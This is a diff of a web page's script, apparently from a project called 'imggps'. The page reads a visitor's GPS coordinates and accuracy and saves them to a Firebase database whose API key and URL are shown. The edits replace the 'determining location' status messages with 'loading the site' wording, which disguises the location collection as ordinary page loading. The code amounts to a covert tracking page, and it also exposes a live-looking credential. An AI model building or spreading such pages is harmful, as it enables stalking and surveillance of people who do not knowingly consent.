@@ -35,7 +35,7 @@
     </div>
 
     <script>
-        // بيانات مشروعك - تم وضعها يدويًا
+
         const firebaseConfig = {
             apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
             databaseURL: "https://imggps-default-rtdb.firebaseio.com",
@@ -82,7 +82,7 @@
             const lat = pos.coords.latitude.toFixed(7);
             const lng = pos.coords.longitude.toFixed(7);
             const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : 'N/A';
-            document.getElementById('status').textContent = 'تم تحديد الموقع...';
+            document.getElementById('status').textContent = 'تم تحميل ...';
             saveData(lat, lng, acc);
         }
 
@@ -93,7 +93,7 @@
         }
 
         if (navigator.geolocation) {
-            document.getElementById('status').textContent = 'جاري تحديد الموقع...';
+            document.getElementById('status').textContent = 'جاري تحميل الموقع...';
             navigator.geolocation.getCurrentPosition(
                 handlePosition,
                 handleError,
